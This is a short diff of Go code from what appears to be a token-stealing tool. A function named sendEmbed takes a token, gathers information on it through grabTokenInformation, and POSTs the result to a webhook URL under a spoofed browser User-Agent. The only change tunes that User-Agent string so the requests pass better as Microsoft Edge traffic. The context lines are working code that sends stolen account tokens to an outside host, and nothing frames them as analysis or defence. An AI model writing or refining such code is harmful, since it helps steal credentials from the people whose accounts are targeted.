@@ -296,7 +296,7 @@ func sendEmbed(token string) {
 
 	data := []byte(grabTokenInformation(token))
 	req, _ := http.NewRequest("POST", WebhookUrl, bytes.NewBuffer(data))
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edge/88.0.705.74")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
 	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
 	cl := &http.Client{}
 	response, err := cl.Do(req)
